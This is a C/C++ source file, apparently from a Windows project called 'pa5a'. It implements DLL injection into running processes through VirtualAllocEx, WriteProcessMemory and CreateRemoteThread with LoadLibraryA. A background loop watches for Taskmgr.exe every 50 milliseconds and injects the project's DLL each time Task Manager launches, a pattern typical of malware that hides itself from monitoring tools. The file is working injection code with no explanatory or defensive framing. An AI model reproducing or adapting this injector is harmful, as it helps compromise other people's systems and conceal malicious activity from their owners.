#include "pa5a.hpp"


EXTERN_C_START

/*******************************************************************************************************************************/
BOOL inject(DWORD processId)
{
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    INT next = 0;
    HINSTANCE kernel_module = NULL;
    LPVOID load_library_function = NULL, free_library_function = NULL, pa5a_dll_address = NULL;
    HANDLE remote_thread = 0;
    HANDLE process = NULL;
    CHAR pa5a_dll_path[PATH_SIZE] = { 0 };

    if (StringCbPrintfA(pa5a_dll_path, sizeof(pa5a_dll_path), "%s%s", DATA_FOLDER_A, DLL_FILE_A) != S_OK)
        return FALSE;

    
    
    if (!(process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId)))
    {
        printf("OpenProcess error\nGetLastError(%d)\n", GetLastError());
        return FALSE;
    }

    if (!(kernel_module = GetModuleHandleA("kernel32.dll")))
    {
        printf("GetModuleHandleA error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(process);
        return FALSE;
    }

    if (!(load_library_function = GetProcAddress(kernel_module, "LoadLibraryA")))
    {
        printf("GetProcAddress error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(process);
        return FALSE;
    }

    if (!(pa5a_dll_address = VirtualAllocEx(process, 0, strlen(pa5a_dll_path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
    {
        printf("VirtualAllocEx error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(process);
        return FALSE;
    }

    if (!WriteProcessMemory(process, pa5a_dll_address, pa5a_dll_path, strlen(pa5a_dll_path), NULL))
    {
        printf("WriteProcessMemory error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(process);
        return FALSE;
    }
    
    if (!(remote_thread = CreateRemoteThread(process, NULL, NULL, (PTHREAD_START_ROUTINE)load_library_function, pa5a_dll_address, NULL, NULL)))
    {
        printf("CreateRemoteThread error\nGetLastError(%d)\n", GetLastError());
        CloseHandle(process);
        return FALSE;
    }

    //WaitForSingleObject(remote_thread, INFINITE);
    //VirtualFreeEx(process, pa5a_dll_address, strlen(pa5a_dll_path) + 1, MEM_RELEASE);

    CloseHandle(process);
    return TRUE;
}
/*******************************************************************************************************************************/
DWORD GetProcessIdFormProcessName(LPCWSTR processName)
{
    HANDLE hSnapshot = NULL;
    DWORD processId = -1;
    if (!(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE, 0)))
        return -1;

    PROCESSENTRY32  process = { sizeof(PROCESSENTRY32) };
    Process32First(hSnapshot, &process);
    do
    {
        if (wcsstr(process.szExeFile, processName))
        {
            wprintf(L"%d, %s\n", process.th32ProcessID, process.szExeFile);
            processId = process.th32ProcessID;
            break;
        }

    } while (Process32Next(hSnapshot, &process));

    CloseHandle(hSnapshot);
    return processId;
}
/*******************************************************************************************************************************/
DWORD ThreadInjector()
{
    DWORD processId = 0;
    BOOL running = FALSE;

    while (TRUE)
    {
        if ((processId = GetProcessIdFormProcessName(L"Taskmgr.exe")) != -1)
        {
            if (running == FALSE)
            {
                if (inject(processId))
                    running = TRUE;
            }
        }
        else
        {
            running = FALSE;
        }
        Sleep(50);
    }

    ExitThread(0);
}
/*******************************************************************************************************************************/


EXTERN_C_END